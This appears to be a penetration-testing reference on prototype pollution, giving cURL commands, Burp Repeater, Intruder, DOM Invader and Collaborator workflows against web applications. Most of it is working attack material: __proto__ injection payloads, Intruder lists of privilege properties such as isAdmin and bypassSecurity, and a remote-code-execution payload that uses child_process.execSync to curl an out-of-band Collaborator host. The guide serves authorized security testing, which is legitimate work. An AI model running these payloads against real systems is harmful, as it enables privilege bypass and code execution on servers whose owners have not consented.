# Prototype Pollution — Testing Tools and Workflows

## When this applies

You need reproducible commands for cURL-based detection, Burp Suite-driven exploitation, scripted Python detection, or browser-console verification during a pentest engagement.

## Technique

Multiple parallel approaches: cURL for one-off checks, Burp Repeater/Intruder for iterative payload tuning, DOM Invader for client-side exploration, Python scripts for at-scale automation.

## Steps

### cURL Commands

```bash
# Client-side detection (won't show in response, need browser)
curl -v "https://target.com/?__proto__[test]=value"

# Server-side JSON spaces detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "data": "test",
    "__proto__": {
      "json spaces": 10
    }
  }'

# Server-side status code detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -w "\nHTTP Status: %{http_code}\n" \
  -d '{
    "__proto__": {
      "status": 555
    }
  }'

# Property reflection detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "testProperty": "vulnerable"
    }
  }' | jq '.'

# RCE test with Burp Collaborator
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "execArgv": [
        "--eval=require(\"child_process\").execSync(\"curl https://YOUR-COLLAB.oastify.com\")"
      ]
    }
  }'

# GET parameter testing
curl -G "https://target.com/endpoint" \
  --data-urlencode "__proto__[test]=value"

# Cookie-based (if parsed as JSON)
curl https://target.com/endpoint \
  -H "Cookie: config={\"__proto__\":{\"test\":\"value\"}}"
```

### Burp Suite Repeater Workflows

**Client-Side Testing:**
1. Navigate to target URL
2. Right-click → "Open in browser" (Burp's built-in)
3. Manually add `?__proto__[test]=value` to URL
4. Open DevTools Console
5. Check `Object.prototype`

**Server-Side Testing:**
1. Find JSON POST in Proxy history
2. Send to Repeater (`Ctrl+R`)
3. Modify JSON body to include `__proto__`
4. Send (`Ctrl+Space`)
5. Examine response (Pretty/Raw tabs)

### DOM Invader

```
1. Enable DOM Invader
   - Burp → Built-in Browser
   - DOM Invader (bottom panel)
   - Settings → Enable "Prototype pollution"

2. Navigate to target
   - DOM Invader auto-detects sources

3. Scan for gadgets
   - Click "Scan for gadgets"
   - Wait for analysis
   - Review found gadgets

4. Exploit
   - Select gadget
   - Click "Exploit"
   - Verify alert() or payload execution
```

### Burp Intruder Payloads

**Positions:**
```json
{
    "data": "test",
    "__proto__": {
        "§property§": "§value§"
    }
}
```

**Payload Lists (Property Names):**
```
isAdmin
isAuthenticated
role
canAccess
privilegeLevel
userId
tenantId
organizationId
permissions
features
debug
bypassSecurity
rateLimit
apiKey
```

**Payload Lists (Values):**
```
true
false
admin
administrator
999
0
null
[]
{}
```

### Burp Collaborator Integration

**Setup:**
1. Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. Note your unique domain: `YOUR-ID.oastify.com`

**Usage in Payloads:**
```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://YOUR-ID.oastify.com')"
        ]
    }
}
```

**Polling:**
1. Click "Poll now" in Collaborator client
2. Look for DNS queries and HTTP requests
3. Review interaction details

## Verifying success

- cURL: response body shows pollution side-effect (indentation, status code, reflected property).
- Burp Repeater: response differs between baseline and pollution payload.
- DOM Invader: "Exploit" button generates a working `alert(1)` or chosen sink trigger.
- Intruder: bulk results identify which property names succeed in privilege bypass.
- Collaborator: DNS/HTTP interaction confirms RCE/SSRF.

## Common pitfalls

1. **`-d` strips newlines, mangles nested JSON** — use `--data-binary @file.json` for complex payloads.
2. **Burp built-in browser uses Burp's CA** — install it in your normal browser too if you need to test outside Burp.
3. **DOM Invader unsupported on older Burp Community** — needs Burp Pro for full feature set.
4. **Intruder with large payload lists hits rate limits** — throttle requests with delay.
5. **Collaborator poll has lag** — wait 30+ seconds before assuming a payload didn't work.

## Tools

- **Burp Suite Pro** — DOM Invader, Repeater, Intruder, Collaborator
- **`curl`** + `jq` — quick CLI checks
- **`ppmap`** — `npm install -g ppmap`
- **Python `requests`** — at-scale scanning (see `detection.md` for Python scripts)
- **Server-Side PP Scanner (Burp BApp Store)** — automated server-side detection
- **PP Gadgets Finder (Doyensec / Burp BApp)** — gadget chain identification
